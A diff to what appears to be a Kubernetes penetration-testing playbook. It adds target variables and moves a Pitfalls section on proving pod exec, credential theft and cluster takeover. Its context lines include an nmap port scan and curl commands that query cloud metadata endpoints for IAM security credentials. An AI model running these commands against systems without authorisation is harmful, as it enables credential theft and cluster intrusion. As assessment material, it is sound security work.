@@ -27,6 +27,10 @@ metadata:
 ## How to Run
 
 ```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
 # Common Kubernetes / container ports
 PORTS="443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010"
 nmap -sV -p $PORTS $TARGET 2>/dev/null | grep open
@@ -41,7 +45,6 @@ curl --max-time 30 --connect-timeout 10 -s "http://169.254.169.254/latest/meta-d
 TOK=$(curl --max-time 30 --connect-timeout 10 -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
 curl --max-time 30 --connect-timeout 10 -s -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 curl --max-time 30 --connect-timeout 10 -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
-# ... (continues in Procedure)
 ```
 
 ## Procedure
@@ -332,6 +335,15 @@ curl --max-time 30 --connect-timeout 10 -sk "$SRV/apis/admissionregistration.k8s
 
 ---
 
+## Pitfalls
+- **Anonymous kubelet access without pod exec** — read-only kubelet access is recon. Need pod exec, log exfil, or credential access.
+- **etcd without auth but encrypted** — etcd may store encrypted secrets. Test secret decryption before claiming credential theft.
+- **Kubernetes dashboard without login** — the dashboard's skip-login option is a known misconfiguration. Test actual pod exec, not just visibility.
+- **RBAC enumeration without exploitation** — listing roles is informational. Need to demonstrate what the roles allow you to do.
+- **Service account token without cluster-admin** — default service account tokens have limited permissions. Verify the token's actual permissions before claiming cluster takeover.
+
+---
+
 ## Verification
 
 - Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
@@ -339,10 +351,3 @@ curl --max-time 30 --connect-timeout 10 -sk "$SRV/apis/admissionregistration.k8s
 - Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
 
 ---
-
-## Pitfalls
-- **Anonymous kubelet access without pod exec** — read-only kubelet access is recon. Need pod exec, log exfil, or credential access.
-- **etcd without auth but encrypted** — etcd may store encrypted secrets. Test secret decryption before claiming credential theft.
-- **Kubernetes dashboard without login** — the dashboard's skip-login option is a known misconfiguration. Test actual pod exec, not just visibility.
-- **RBAC enumeration without exploitation** — listing roles is informational. Need to demonstrate what the roles allow you to do.
-- **Service account token without cluster-admin** — default service account tokens have limited permissions. Verify the token's actual permissions before claiming cluster takeover.
